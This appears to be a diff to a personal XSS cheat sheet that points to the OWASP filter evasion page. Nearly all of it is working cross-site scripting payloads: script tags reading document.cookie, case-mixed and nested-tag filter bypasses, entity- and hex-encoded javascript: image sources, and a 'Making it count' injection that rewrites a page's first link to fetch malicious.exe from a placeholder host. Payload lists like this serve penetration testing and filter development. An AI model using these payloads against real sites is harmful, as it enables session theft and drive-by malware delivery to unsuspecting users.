@@ -1,6 +1,15 @@
 * OWASP XSS Links
 https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet
 
+* Basic Strings
+<script>alert(123)</script>
+“><script>alert(document.cookie)</script>
+"><script >alert(document.cookie)</script >
+"><ScRiPt>alert(document.cookie)</ScRiPt>
+"%3cscript%3ealert(document.cookie)%3c/script%3e
+<scr<script>ipt>alert(document.cookie)</script>
+
+
 
 * Testing Strings
 
@@ -25,12 +34,22 @@ Inject String, view source, look for <XSS verses &lt;XSS to see if it is vulnera
 <IMG SRC= onmouseover="alert('xxs')">
 <IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>
 
-* Encoded Strings
+** Encoded Strings
 <IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;
 &#39;&#88;&#83;&#83;&#39;&#41;>
 <IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&
 #0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
-*** Malformed
+<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
+
+* Making it count
+http://example.com/index.php?user=<script>window.onload = function() {var AllLinks=document.getElementsByTagName("a"); 
+AllLinks[0].href = "http://badexample.com/malicious.exe"; }</script> 
+Downloads exe from badexample
+
+
+
+
+
 <a onmouseover="alert(document.cookie)">xxs link</a>
 <IMG """><SCRIPT>alert("XSS")</SCRIPT>">
 
